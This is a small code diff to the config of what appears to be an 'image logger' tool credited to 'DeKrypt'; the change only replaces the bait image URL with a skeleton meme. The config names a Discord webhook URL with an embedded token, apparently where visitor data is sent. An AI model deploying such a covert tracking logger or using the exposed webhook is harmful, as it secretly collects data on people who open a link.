@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1482517571977609478/XxZHWn-y3re7zMFHgvvIl3vbjpT_eVU6h2Hh07SIqUxPW04bdjE4jqfoLbqu0PhlMtbZ",
-    "image": "https://tenor.com/view/muerto-gif-16250174877271582365", # You can also have a custom image by using a URL argument
+    "image": "https://en.meming.world/images/en/1/1a/Spooky_Skeleton.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
